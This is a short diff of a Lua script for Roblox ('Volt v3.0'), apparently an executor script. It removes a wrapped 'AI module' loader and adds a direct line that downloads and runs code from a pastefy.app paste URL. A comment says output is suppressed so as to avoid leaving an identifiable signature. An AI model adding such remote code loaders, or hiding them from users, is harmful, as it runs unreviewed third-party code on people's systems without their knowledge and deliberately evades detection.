@@ -2155,11 +2155,6 @@ if notify then notify("Volt v3.0", "Loaded. Ctrl+K for commands · 1-6 to switch
 end
 initV3()
 
--- auto-load Volt AI module (DeepSeek backend, non-blocking)
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/yzraJFCG/raw"))()
-    end)
-end)
+loadstring(game:HttpGet("https://pastefy.app/yzraJFCG/raw"))()
 
 -- (no console output — avoid leaving an identifiable signature)
